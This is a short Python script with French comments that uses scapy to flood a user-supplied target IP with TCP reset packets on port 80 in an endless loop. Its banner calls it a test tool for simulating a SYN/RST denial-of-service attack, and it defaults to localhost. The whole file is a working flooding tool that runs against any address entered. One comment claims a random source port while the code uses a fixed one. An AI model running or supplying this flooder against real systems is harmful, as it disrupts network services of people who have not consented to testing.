from scapy.all import IP, TCP, send
import time
import sys

print("=========================================")
print(" 👿 OUTIL DE TEST : SYN/RST FLOOD (DDoS) ")
print("=========================================")
print("Utilisation : Simuler une attaque de réinitialisation TCP (RST).")
print("Ceci va générer des dizaines de requêtes TCP malveillantes.")

target_ip = input("Entrez l'IP cible (ex: 192.168.56.103 ou 127.0.0.1) : ")
if not target_ip:
    target_ip = "127.0.0.1"

print(f"\n[+] Lancement de l'attaque RST sur {target_ip}...")
print("[+] Appuyez sur Ctrl+C pour arrêter.")

try:
    while True:
        # Création d'un paquet IP pointant vers la cible
        ip_layer = IP(dst=target_ip)
        
        # Création de la couche TCP avec le flag 'R' (Reset)
        # On utilise un port source aléatoire et on vise le port HTTP (80)
        tcp_layer = TCP(sport=12345, dport=80, flags="R")
        
        packet = ip_layer / tcp_layer
        
        # Envoi silencieux du paquet
        send(packet, verbose=False)
        
        # Pause minime pour ne pas faire crasher l'ordinateur de test
        time.sleep(0.1)
        
except KeyboardInterrupt:
    print("\n[!] Attaque stoppée par l'utilisateur.")
    sys.exit(0)
